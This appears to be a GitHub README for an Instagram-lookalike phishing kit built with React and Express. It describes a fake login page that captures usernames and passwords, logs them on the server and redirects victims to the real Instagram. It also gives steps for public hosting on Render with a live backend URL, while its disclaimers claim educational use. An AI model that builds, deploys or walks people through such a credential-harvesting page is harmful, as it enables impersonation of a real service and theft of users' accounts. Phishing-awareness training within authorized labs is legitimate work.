# Instagram-Style Phishing Simulation (No DB - MERN)

> ⚠️ For educational and ethical hacking use only. Unauthorized deployment is illegal.

This project is a simple phishing simulation tool built with **React and Express**, styled to look like the **Instagram login page**. It captures fake credentials and logs them to the console — no database needed.

---

## 🔧 Features

- Instagram-style React login form
- Fake login captures credentials
- Logs username and password to backend console
- Redirects to real Instagram login page
- Ready for deployment on **Render.com**

---

## 📁 Project Structure

```
phish-instagram-clone/
├── client/         # React frontend
│   ├── src/
│   │   ├── App.js
│   │   ├── App.css
├── server/         # Express backend
│   ├── index.js
```

---

## 🚀 Run Locally

### 1. Clone the Repository

```bash
git clone https://github.com/yourusername/phish-instagram-clone.git
cd phish-instagram-clone
```

---

### 2. Start Backend

```bash
cd server
npm install
npm start
```

Backend runs on: `http://localhost:5000`

---

### 3. Start Frontend

```bash
cd ../client
npm install
npm start
```

Frontend runs on: `http://localhost:3000`

---

## 🧪 How It Works

1. User enters fake Instagram login.
2. Credentials sent to backend via POST `/api/login`.
3. Backend logs them to the console.
4. User sees a fake error message and is redirected to the real Instagram login page.

---

## 🚀 Deploying to Render

### 📦 Backend (Web Service)

- Root: `/server`
- Start command: `node index.js`
- Build command: `npm install`
- Expose port: `5000`

### 🌐 Frontend (Static Site)

- Root: `/client`
- Build command: `npm install && npm run build`
- Publish directory: `build`

Update `axios.post("http://localhost:5000/api/login", ...)` in `App.js` to:

```js
axios.post("https://your-render-backend-url.onrender.com/api/login", ...)
```

---

## ⚠️ Disclaimer

This tool is for **educational, research, or penetration testing training** only.

- ❌ Unauthorized use is illegal.
- ✅ Use in labs, demos, or with proper consent.

